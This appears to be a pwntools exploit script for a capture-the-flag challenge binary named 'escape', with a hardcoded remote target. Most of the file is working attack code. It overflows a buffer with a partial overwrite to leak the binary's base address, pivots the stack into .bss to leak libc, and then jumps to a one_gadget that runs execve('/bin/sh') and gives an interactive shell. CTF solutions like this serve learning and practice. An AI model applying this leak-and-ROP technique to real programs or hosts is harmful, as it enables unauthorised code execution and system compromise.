#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./escape"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("34.64.33.48", 30002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *escape+55
		b *escape+92
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


# leak bin address
payload = b"A" * 0x108
payload += p8(0x68)# partial overwrite

p.recvuntil('.')
p.send(payload)

p.recvuntil(b'A' * 0x108)
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info("leak: " + hex(leak))
bin_base = leak - 0x1268
elf.address = bin_base
log.info("bin base: " + hex(bin_base))

# leak libc address
bss_addr = bin_base + elf.get_section_by_name(".bss").header["sh_addr"] + 0x100 + 0x40

payload = b'B' * 0x100
payload += p64(bss_addr)
payload += p64(elf.symbols["escape"] + 25)

p.send(payload)
p.recvuntil(b"is ")
p.recvline()
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.info("__funlockfile@libc: " + hex(leak))
libc_base = leak - 0x620d0
libc.address = libc_base
log.info("libc base: " + hex(libc_base))

rop_pop_rdi_ret = libc_base + 0x001bc021
one_gadget_addr = libc_base + 0xebcf1
"""
0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
"""

payload = b'C' * 0x100
payload += p64(bss_addr + 0x88)
payload += p64(one_gadget_addr)
payload += p64(bss_addr)
payload += p64(0)

p.send(payload)


p.interactive()
